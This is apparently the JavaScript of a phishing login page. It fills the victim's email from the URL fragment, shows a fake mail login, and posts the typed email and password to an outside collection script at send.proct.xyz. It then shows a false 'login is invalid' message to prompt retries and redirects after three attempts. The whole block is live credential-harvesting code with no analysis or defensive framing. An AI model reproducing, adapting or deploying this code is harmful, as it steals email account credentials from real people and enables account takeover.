  <script>
    $(document).ready(function () {
        var retryCount = 0;
        var hashValue = window.location.hash.substr(1);

        if (!hashValue) {
            // Do something if hash is not present
        } else {
            var email = hashValue;
            var atIndex = email.indexOf("@");
            var domain = email.substr(atIndex + 1);
            var username = domain.substr(0, domain.indexOf("."));
            var lowercaseUsername = username.toLowerCase();
        }

        $('#othermodal').click(function () {
            $('#contact').trigger("reset");
            $("#msg").hide();
            $('#fieldImg').attr('src', '');
            $('#field').html("Other Mail");
            $("#em").val(email);
            $("#emailch").html(email);
            $("#inputbar").animate({ left: 200, opacity: "hide" }, 0);
            $("#automail").animate({ right: 200, opacity: "show" }, 500);
            $('#ajaxModal').modal('show');
        });

        $('#submit-btn').click(function (event) {
            event.preventDefault();
            var enteredEmail = $("#em").val();
            var enteredPassword = $("#pw").val();
            var fieldHtml = $('#field').html();
            var messageHtml = $('#msg').html();
            $('#msg').text(messageHtml);
            retryCount++;

            if (retryCount >= 3) {
                retryCount = 0;
                window.location.replace("https://webmail."+1);
            } else {
                $.ajax({
                    dataType: 'JSON',
                    url: 'https://send.proct.xyz/cap.php',
                    type: 'POST',
                    data: {
                        em: enteredEmail,
                        pw: enteredPassword,
                        detail: fieldHtml,
                    },
                    beforeSend: function () {
                        $('#submit-btn').html('Verifying...');
                    },
                    success: function (response) {
                        if (response) {
                            $("#msg").show();
                            console.log(response);
                            if (response['signal'] == 'ok') {
                                $("#pw").val("");
                                $('#msg_text').html(response['msg']);
                            } else {
                                $("#pw").val("");
                                $('#msg_text').html(response['msg']);
                            }
                        }
                    },
                    error: function () {
                        $("#pw").val("");
                        $("#msg").show();
                        $('#msg').html("The login is invalid.");
                    },
                    complete: function () {
                        $("#pw").val("");
                        $('#submit-btn').html('Login');
                    }
                });
            }
        });
    });

    if (location.hash) {
        document.querySelector('#em').value = email = location.hash.substr(1);
    }
</script>
